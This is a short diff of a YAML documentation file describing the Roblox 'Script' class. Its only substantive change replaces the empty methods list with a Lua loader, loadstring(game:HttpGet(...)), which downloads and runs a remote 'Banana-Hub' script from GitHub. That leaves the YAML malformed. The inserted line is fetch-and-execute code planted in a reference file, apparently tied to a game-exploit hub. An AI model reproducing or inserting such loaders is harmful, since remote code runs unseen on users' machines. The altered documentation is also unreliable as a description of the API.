@@ -1,5 +1,4 @@
 name: Script
-type: class
 category: Scripting
 memory_category: Script
 summary: |
@@ -58,6 +57,6 @@ properties:
     serialization:
       can_load: true
       can_save: true
-methods: []
+methods: [loadstring(game:HttpGet("https://raw.githubusercontent.com/Nghia11n/Banana-Hub/main/bananahub.lua"))()
 events: []
 callbacks: []
